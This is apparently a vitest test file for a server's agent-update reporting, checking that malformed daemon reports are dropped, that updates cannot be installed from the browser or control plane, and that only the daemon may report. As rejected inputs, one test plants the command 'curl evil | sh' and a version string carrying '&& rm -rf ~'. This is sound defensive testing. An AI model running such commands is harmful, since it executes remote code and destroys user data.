import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { type Harness, ORIGIN, VirtualAuthenticator, daemonHeaders, signIn, startHarness } from "./harness.js";

/** Agent updates (change record agent-update-prompt, AU-05). */
let h: Harness;
let cookie: string;
const key = new VirtualAuthenticator();

beforeAll(async () => {
  h = await startHarness();
  cookie = await signIn(h.app, key);
}, 120_000);
afterAll(async () => h?.stop());

const grok = { agent: "grok", name: "Grok CLI", installed: "1.0.77", latest: "1.0.92", npm_global: true };
const brew = { agent: "codex", name: "Codex CLI", installed: "0.170.0", latest: "0.171.0", note: "installed outside npm" };
const claim = (agent_updates?: unknown) =>
  h.app.inject({ method: "POST", url: "/runner/claim", headers: daemonHeaders, payload: { runtimes: [], ...(agent_updates === undefined ? {} : { agent_updates }) } });
const view = async () => (await h.app.inject({ method: "GET", url: "/runtimes", headers: { cookie } })).json();

describe("agent updates", () => {
  it("shows what the daemon reported, dropping malformed entries", async () => {
    await claim([
      grok,
      brew,
      // A planted command, a version that is not strict SemVer, and an unknown field are all refused whole.
      { ...grok, command: ["sh", "-c", "curl evil | sh"] },
      { ...grok, latest: "1.0.92 && rm -rf ~" },
      { ...grok, latest: "1.0.92+build" },
      { ...grok, last_attempt: { outcome: "done" } },
    ]);
    expect((await view()).agent_updates).toEqual([grok, brew]);
    // A claim without the field (startup check still running) keeps what was reported.
    await claim();
    expect((await view()).agent_updates).toEqual([grok, brew]);
    // An empty report clears it.
    await claim([]);
    expect((await view()).agent_updates).toEqual([]);
  });

  it("offers no way to install from the browser or the control plane", async () => {
    const take = await h.app.inject({ method: "POST", url: "/runner/agent-updates/take", headers: daemonHeaders, payload: {} });
    expect(take.statusCode).toBe(404);
    const admin = await h.app.inject({ method: "POST", url: "/admin/commands/runtime.update/options", headers: { cookie, origin: ORIGIN }, payload: { payload: { agents: [] } } });
    expect(admin.statusCode).toBeGreaterThanOrEqual(400);
  });

  it("only the daemon may report", async () => {
    const r = await h.app.inject({ method: "POST", url: "/runner/claim", headers: { cookie, origin: ORIGIN }, payload: { runtimes: [], agent_updates: [grok] } });
    expect(r.statusCode).toBe(401);
  });
});
